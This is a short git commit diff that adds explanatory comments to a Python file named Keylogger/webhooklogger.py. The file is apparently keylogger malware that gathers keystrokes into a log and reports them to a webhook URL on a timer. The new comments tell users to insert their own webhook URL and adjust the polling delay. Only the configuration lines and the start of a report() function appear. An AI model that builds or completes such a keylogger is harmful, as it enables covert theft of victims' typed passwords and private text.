a705ff99ec1c9b49549e8602a4b723542abfd1c9
Brandon Burns <brandontbb33@gmail.com>
2025-12-10 02:36:57 -0800

    Comments added for clarity.

--- Keylogger/webhooklogger.py
+++ Keylogger/webhooklogger.py
@@ -7,10 +7,13 @@ from dotenv import load_dotenv
 # Note: os and dotenv not needed for this script. Only included to hide webhook URL. 
 # Replace "os.getenv("WEBHOOK_URL")" with your webhook URL. 
 
-load_dotenv()
+# Timing can be adjusted by changing the number in the threading.Timer() function. This will change
+# the polling delay.
+
+load_dotenv() # Delete line for personal use.
 
 log = ""
-WEBHOOK_URL = os.getenv("WEBHOOK_URL")
+WEBHOOK_URL = os.getenv("WEBHOOK_URL") #Replace with your webhook URL.
 
 def report():
     global log
